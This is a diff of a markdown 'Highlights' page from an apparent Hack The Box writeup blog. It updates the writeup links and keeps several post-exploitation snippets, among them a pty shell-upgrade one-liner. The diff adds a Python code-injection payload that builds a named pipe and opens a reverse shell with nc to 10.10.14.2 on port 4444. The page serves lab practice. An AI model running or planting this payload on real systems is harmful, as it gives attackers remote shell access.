@@ -1,14 +1,14 @@
 ---
 title: "Highlights"
 date: 2020-01-03T20:06:24-05:00
-draft: falase
+draft: true
 ---
 
 # Writeups
-[Postman](htb/postman)
-[Craft](htb/craft)
-[Sneaky](htb/sneaky)
-[Traverxec](htb/traverxec)
+[Postman](post/htb/postman)
+[Craft](post/htb/craft)
+[Sneaky - Coming Soon](post/htb/sneaky)
+[Traverxec - Coming Soon](post/htb/traverxec)
 
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -17,3 +17,11 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```python
 __import__("os"); os.system("pwd")
 ```
+
+**python code injection w/import and backpiping**
+
+```bash
+__import__("os").system("mknod /tmp/backpipe2 p && /bin/sh 0</tmp/backpipe2 | nc 10.10.14.2 4444 1>/tmp/backpipe2")
+```
+
+![test image](/img/craft/developer.png)
